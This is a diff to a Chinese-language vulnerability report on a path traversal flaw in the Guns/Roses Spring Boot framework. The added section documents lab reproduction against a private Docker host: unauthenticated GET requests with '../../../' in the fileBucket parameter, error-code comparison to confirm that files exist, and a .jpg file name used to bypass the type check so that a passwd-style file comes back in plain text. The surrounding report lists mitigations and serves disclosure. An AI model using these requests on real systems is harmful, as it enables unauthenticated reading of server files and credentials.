@@ -146,8 +146,61 @@ fileObjectName=hosts"
 4. **容器化最小权限**：应用进程以非 root 运行，限制访问系统敏感文件
 5. **审计 `@GetResource(requiredLogin = false)`**：全项目扫描匿名接口，逐一评估风险
 
+## 实机验证（已复现）
+
+**环境**：Guns 最新分支，自编译 JAR，Docker 部署于 192.168.217.135
+
+### 验证过程
+
+**步骤1：对比测试（B0909 vs B0911）**
+
+```
+# 容器内存在 /tmp/traversal_test.txt
+GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=traversal_test.txt
+
+HTTP/1.1 500
+{"code":"B0911","message":"预览文件异常，您预览的文件类型不支持或文件出现错误"}
+```
+
+```
+# 不存在的文件
+GET /sysFileInfo/previewByObjectName?fileBucket=default&fileObjectName=nonexistent.jpg
+
+HTTP/1.1 500
+{"code":"B0909","message":"获取文件流异常，具体信息为：本地文件不存在"}
+```
+
+**关键差异**：访问路径穿越后的真实文件返回 `B0911`（文件存在但类型不支持），访问不存在文件返回 `B0909`，证明路径穿越有效。
+
+**步骤2：读取容器内任意文件（以 .jpg 伪装文件类型绕过渲染检查）**
+
+```http
+GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=fakepsswd.jpg HTTP/1.1
+Host: 192.168.217.135:58080
+(无任何认证头)
+```
+
+**响应**：
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/png
+Content-Length: 83
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+```
+
+**HTTP 200，文件内容直接明文返回！** 容器存储根目录 `/opt/gunsFilePath` 外的任意文件均可读取。
+
+### 结论
+- 端点 `/sysFileInfo/previewByObjectName` 无需登录（`requiredLogin=false`）
+- `fileBucket` 参数未验证，可插入 `../` 穿越至任意目录
+- 将文件命名为 `.jpg` / `.png` 可绕过文件类型渲染限制，直接获取文件内容
+
 ## 验证环境
 
-- 源代码：Guns / Roses Framework 最新分支（静态代码分析）
-- 框架：Spring Boot + Hutool
+- 源代码：Guns / Roses Framework 最新分支（自编译 + Docker 部署）
+- 测试环境：192.168.217.135:58080
+- 框架：Spring Boot 3 + Hutool
 - 日期：2026-04-14
